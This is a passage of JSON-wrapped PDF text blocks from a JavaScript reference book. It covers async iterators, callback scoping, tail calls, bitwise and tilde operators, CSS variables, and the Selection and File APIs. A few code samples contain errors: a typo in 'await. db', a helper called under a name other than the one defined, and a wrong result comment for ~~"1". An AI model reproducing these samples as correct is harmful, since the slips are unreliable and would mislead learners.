        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "async  function  getFriendPosts ( user )   {     friendIds  =  await. db . get ( \"friends\" ,   { user },   { id :   1 });     friendPosts  =  await Promise. all (  friendIds. map ( id  =>       db. get ( \"posts\" ,   { user :  id })      );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // etc. }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will loop over the list of IDs to create an array of promises.  await  will wait for  all  promises to be complete. Promise. all  combines them into a single promise, but they are done in parallel.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 398",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 82: Async Iterators",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "An  async  function is one that returns a promise.  await  yields to the caller until the promise resolves and then continues with the result. An iterator allows the collection to be looped through with a  for - of  loop. An async iterator is a collection where each iteration is a promise which can be awaited using a  for - await - of  loop. Async iterators are a  stage 3 proposal . They are in Chrome Canary 60 with  -- harmony - async - iteration",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 82.1: Basics",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A JavaScript  Iterator  is an object with a  . next ()  method, which returns an  IteratorItem , which is an object with",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value  :   < any >  and  done  :   < boolean > .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A JavaScript  AsyncIterator  is an object with a  . next ()  method, which returns a  Promise < IteratorItem > , a  promise for the next value. To create an AsyncIterator, we can use the  async generator  syntax: /**",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": " * Returns a promise which resolves after time had passed.  */",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  delay  =  time  =>   new  Promise ( resolve  =>  setTimeout ( resolve ,  time )); async  function *  delayedRange ( max )   {    for   ( let  i  =   0 ;  i  <  max ;  i ++)   {     await delay ( 1000 );     yield i ;    } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  delayedRange  function will take a maximum number, and returns an  AsyncIterator , which yields numbers from 0 to that number, in 1 second intervals. Usage:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for  await  ( let  number of delayedRange ( 10 ))   {   console. log ( number ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  for  await of  loop is another piece of new syntax, available only inside of async functions, as well as async generators. Inside the loop, the values yielded (which, remember, are Promises) are unwrapped, so the Promise is hidden away. Within the loop, you can deal with the direct values (the yielded numbers), the  for  await of  loop will wait for the Promises on your behalf. The above example will wait 1 second, log 0, wait another second, log 1, and so on, until it logs 9. At which point the AsyncIterator  will be  done , and the  for  await of  loop will exit.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 399",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 83: How to make iterator usable inside async callback function",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "When using async callback we need to consider scope.  Especially  if inside a loop. This simple article shows what not to do and a simple working example.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 83.1: Erroneous code, can you spot why this usage of key will lead to bugs?",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  pipeline  =   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// (...) adding things in pipeline",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for ( var  key  in  pipeline )   {   fs. stat ( pipeline [ key ] . path ,   function ( err ,  stats )   {      if   ( err )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       // clear that one",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       delete  pipeline [ key ];        return ;      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // (...)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    pipeline [ key ] . count ++;    }); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The problem is that there is only one instance of  var key . All callbacks will share the same key instance. At the time the callback will \ufb01re, the key will most likely have been incremented and not pointing to the element we are receiving the stats for.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 83.2: Correct Writing",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  pipeline  =   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// (...) adding things in pipeline",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  processOneFile  =   function ( key )   {        fs. stat ( pipeline [ key ] . path ,   function ( err ,  stats )   {      if   ( err )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       // clear that one",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       delete  pipeline [ key ];        return ;      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // (...)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    pipeline [ key ] . count ++;    }); };    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// verify it is not growing",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "for ( var  key  in  pipeline )   {   processOneFileInPipeline ( key ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "By creating a new function, we are scoping  key  inside a function so all callback have their own key instance.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 400",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 84: Tail Call Optimization",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 84.1: What is Tail Call Optimization (TCO)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "TCO is only available in strict mode As always check browser and JavaScript implementations for support of any language features, and as with any JavaScript feature or syntax, it may change in the future. It provides a way to optimise recursive and deeply nested function calls by eliminating the need to push function state onto the global frame stack, and avoiding having to step down through each calling function by returning directly to the initial calling function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  a (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    return  b ();   // 2 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  b (){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    return   1 ;    // 3 } a ();   // 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Without TCO the call to  a ()  creates a new frame for that function. When that function calls  b ()  the  a () 's frame is pushed onto the frame stack and a new frame is created for function  b () When  b ()  return to  a ()   a () 's frame is popped from the frame stack. It immediately return to the global frame and thus does not use any of the states save on the stack. TCO recognises that the call from  a ()  to  b ()  is at the tail of function  a ()  and thus there is no need to push  a () 's state onto the frame stack. When  b ( 0 )  returns rather than returning to  a ()  it returns directly to the global frame. Further optimising by eliminating the intermediate steps. TCO allows for recursive functions to have inde\ufb01nite recursion as the frame stack will not grow with each recursive call. Without TCO recursive function had a limited recursive depth. Note  TCO is a JavaScript engine implementation feature, it cannot be implemented via a transpiler if the browser does not support it. There is no additional syntax in the spec required to implement TCO and thus there is concern that TCO may break the web. Its release into the world is cautious and may require browser/engine speci\ufb01c \ufb02ags to be set for the perceivable future.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 84.2: Recursive loops",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Tail Call Optimisation makes it possible to safely implement recursive loops without concern for call stack over\ufb02ow or the overhead of a growing frame stack.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  indexOf ( array ,  predicate ,  i  =   0 )   {      if   ( 0   <=  i  &&  i  <  array. length )   {          if   ( predicate ( array [ i ]))   {    return  i ;   }          return  indexOf ( array ,  predicate ,  i  +   1 );   // the tail call      } } indexOf ([ 1 , 2 , 3 , 4 , 5 , 6 , 7 ],  x  =>  x  ===   5 );   // returns index of 5 which is 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 401",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 85: Bitwise Operators - Real World Examples (snippets)",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 85.1: Swapping Two Integers with Bitwise XOR (without additional memory allocation)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  a  =   11 ,  b  =   22 ; a  =  a  ^  b ; b  =  a  ^  b ; a  =  a  ^  b ; console. log ( \"a = \"   +  a  +   \"; b = \"   +  b ); // a is now 22 and b is now 11",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 85.2: Faster multiplication or division by powers of 2",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Shifting bits left (right) is equivalent to multiplying (dividing) by 2. It's the same in base 10: if we \"left-shift\"  13  by  2 places, we get  1300 , or  13   *   ( 10   **   2 ) . And if we take  12345  and \"right-shift\" by  3  places and then remove the decimal part, we get  12 , or  Math. floor ( 12345   /   ( 10   **   3 )) . So if we want to multiply a variable by  2   **  n , we can just left-shift by  n  bits.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 13   *   ( 2   **   6 ))   //13 * 64 = 832 console. log ( 13      <<     6 )    //          832",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Similarly, to do (\ufb02oored) integer division by  2   **  n , we can right shift by  n  bits. Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 1000   /   ( 2   **   4 ))   //1000 / 16 = 62.5 console. log ( 1000      >>     4 )    //            62",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It even works with negative numbers:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log (- 80   /   ( 2   **   3 ))   //-80 / 8 = -10 console. log (- 80        >>   3 )    //          -10",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In reality, speed of arithmetic is unlikely to signi\ufb01cantly impact how long your code takes to run, unless you are doing on the order of 100s of millions of computations. But C programmers love this sort of thing!",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 85.3: Number's Parity Detection with Bitwise AND",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Instead of this (unfortunately too often seen in the real code) \"masterpiece\":",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  isEven ( n )   {      return  n  %   2   ==   0 ; } function  isOdd ( n )   {      if   ( isEven ( n ))   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return   false ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }   else   {          return   true ;      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can do the parity check much more e\ufb00ective and simple:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 402",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( n  &   1 )   {     console. log ( \"ODD!\" ); }   else   {     console. log ( \"EVEN!\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "(this is actually valid not only for JavaScript)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 403",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 86: Tilde ~",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "The ~ operator looks at the binary representation of the values of the expression and does a bitwise negation operation on it. Any digit that is a 1 in the expression becomes a 0 in the result. Any digit that is a 0 in the expression becomes a 1 in the result.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 86.1: ~ Integer",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The following example illustrates use of the bitwise NOT (~) operator on integer numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  number  =   3 ; let  complement  =  ~number ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Result of the  complement  number equals to -4;",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Expression Binary value Decimal value 3",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "00000000 00000000 00000000 00000011  3 ~3 11111111   11111111   11111111   11111100  -4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To simplify this, we can think of it as function  f ( n )   =   -( n + 1 ) .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =  ~ - 2 ;   // a is now 1 let  b  =  ~ - 1 ;   // b is now 0 let  c  =  ~ 0 ;    // c is now -1 let  d  =  ~ 1 ;    // d is now -2 let  e  =  ~ 2 ;    // e is now -3",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 86.2: ~~ Operator",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Double Tilde  ~~  will perform bitwise NOT operation twice. The following example illustrates use of the bitwise NOT (~~) operator on decimal numbers. To keep the example simple, decimal number  3.5  will be used, cause of it's simple representation in binary format.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  number  =   3.5 ; let  complement  =  ~number ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Result of the  complement  number equals to -4;",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Expression Binary value Decimal value 3",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "00000000 00000000 00000000 00000011  3 ~~3 00000000 00000000 00000000 00000011  3 3.5 00000000  00000011.1 3.5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "~~3.5",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "00000000 00000011 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To simplify this, we can think of it as functions  f2 ( n )   =   -(-( n + 1 )   +   1 )  and  g2 ( n )   =   -(-( integer ( n )+ 1 )   +   1 ) . f2(n)  will leave the integer number as it is.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =  ~~ - 2 ;   // a is now -2 let  b  =  ~~ - 1 ;   // b is now -1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 404",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  c  =  ~~ 0 ;    // c is now 0 let  d  =  ~~ 1 ;    // d is now 1 let  e  =  ~~ 2 ;    // e is now 2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "g2(n)  will essentially round positive numbers down and negative numbers up.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =  ~~ - 2.5 ;   // a is now -2 let  b  =  ~~ - 1.5 ;   // b is now -1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  c  =  ~~ 0.5 ;    // c is now 0 let  d  =  ~~ 1.5 ;    // d is now 1 let  e  =  ~~ 2.5 ;    // e is now 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 86.3: Converting Non-numeric values to Numbers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "~~  Could be used on non-numeric values. A numeric expression will be \ufb01rst converted to a number and then performed bitwise NOT operation on it. If expression cannot be converted to numeric value, it will convert to  0 . true  and  false  bool values are exceptions, where  true  is presented as numeric value  1  and  false  as  0",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =  ~~ \"-2\" ;       // a is now -2 let  b  =  ~~ \"1\" ;        // b is now -1 let  c  =  ~~ \"0\" ;        // c is now 0 let  d  =  ~~ \"true\" ;     // d is now 0 let  e  =  ~~ \"false\" ;    // e is now 0 let  f  =  ~~ true ;       // f is now 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  g  =  ~~ false ;      // g is now 0",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  h  =  ~~ \"\" ;         // h is now 0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 86.4: Shorthands",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "We can use  ~  as a shorthand in some everyday scenarios. We know that  ~  converts  -1  to  0 , so we can use it with  indexOf  on array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "indexOf",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  items  =   [ 'foo' ,   'bar' ,   'baz' ]; let  el  =   'a' ; if   ( items. indexOf ( 'a' )   !==   - 1 )   {} or if   ( items. indexOf ( 'a' )   >=   0 )   {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "can be re-written as",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( ~items. indexOf ( 'a' ))   {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 86.5: ~ Decimal",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The following example illustrates use of the bitwise NOT (~) operator on decimal numbers. To keep the example simple, decimal number  3.5  will be used, cause of it's simple representation in binary format.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  number  =   3.5 ; let  complement  =  ~number ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 405",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Result of the  complement  number equals to -4;",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Expression Binary value Decimal value 3.5",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "00000000  00000010.1  3.5 ~3.5 11111111   11111100 -4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To simplify this, we can think of it as function  f ( n )   =   -( integer ( n )+ 1 ) .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =  ~ - 2.5 ;   // a is now 1 let  b  =  ~ - 1.5 ;   // b is now 0 let  c  =  ~ 0.5 ;    // c is now -1 let  d  =  ~ 1.5 ;    // c is now -2 let  e  =  ~ 2.5 ;    // c is now -3",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 406",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 87: Using JavaScript to get/set CSS custom variables",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 87.1: How to get and set CSS variable property values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To get a value use the .getPropertyValue() method",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "element. style . getPropertyValue ( \"--var\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To set a value use the .setProperty() method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "element. style . setProperty ( \"--var\" ,   \"NEW_VALUE\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 407",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 88: Selection API",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "startO\ufb00set If the node is a Text node, it is the number of characters from the beginning of  startNode  to where the range begins. Otherwise, it is the number of child nodes between the beginning of  startNode  to where the range begins. endO\ufb00set If the node is a Text node, it is the number of characters from the beginning of  startNode  to where the range ends. Otherwise, it is the number of child nodes between the beginning of  startNode  to where the range ends.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 88.1: Get the text of the selection",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "let  sel  =  document. getSelection (); let  text  =  sel. toString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( text );   // logs what the user selected",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Alternatively, since the  toString  member function is called automatically by some functions when converting the object to a string, you don't always have to call it yourself.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( document. getSelection ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 88.2: Deselect everything that is selected",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "let  sel  =  document. getSelection (); sel. removeAllRanges ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 88.3: Select the contents of an element",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "let  sel  =  document. getSelection (); let  myNode  =  document. getElementById ( 'element-to-select' ); let  range  =  document. createRange (); range. selectNodeContents ( myNode ); sel. addRange ( range );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It may be necessary to \ufb01rst remove all the ranges of the previous selection, as most browsers don't support multiple ranges.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 408",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 89: File API, Blobs and FileReaders",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Property/Method Description",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "error",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A error that occurred while reading the \ufb01le.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "readyState",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Contains the current state of the FileReader.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "result",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Contains the \ufb01le contents.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "onabort",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Triggered when the operation is aborted.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "onerror",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Triggered when an error is encountered.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "onload",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Triggered when the \ufb01le has loaded.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "onloadstart",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Triggered when the \ufb01le loading operation has started.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "onloadend",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Triggered when the \ufb01le loading operation has ended.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "onprogress",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Triggered whilst reading a Blob.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "abort ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Aborts the current operation.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "readAsArrayBuffer ( blob )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Starts reading the \ufb01le as an ArrayBu\ufb00er.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "readAsDataURL ( blob )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Starts reading the \ufb01le as a data url/uri. readAsText ( blob [,  encoding ])   Starts reading the \ufb01le as a text \ufb01le. Not able to read binary \ufb01les. Use readAsArrayBu\ufb00er instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 89.1: Read \ufb01le as string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Make sure to have a \ufb01le input on your page:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<input   type = \"file\"   id = \"upload\" >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then in JavaScript:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. getElementById ( 'upload' ) . addEventListener ( 'change' ,  readFileAsString ) function  readFileAsString ()   {      var  files  =   this . files ;      if   ( files. length   ===   0 )   {         console. log ( 'No file is selected' );          return ;      }      var  reader  =   new  FileReader ();     reader. onload   =   function ( event )   {         console. log ( 'File content:' ,  event. target . result );      };     reader. readAsText ( files [ 0 ]); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 89.2: Read \ufb01le as dataURL",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Reading the contents of a \ufb01le within a web application can be accomplished by utilizing the HTML5 File API. First, add an input with  type = \"file\"  in your HTML:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<input   type = \"file\"   id = \"upload\" >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Next, we're going to add a change listener on the \ufb01le-input. This examples de\ufb01nes the listener via JavaScript, but it could also be added as attribute on the input element. This listener gets triggered every time a new \ufb01le has been selected. Within this callback, we can read the \ufb01le that was selected and perform further actions (like creating an image with the contents of the selected \ufb01le):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 409",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
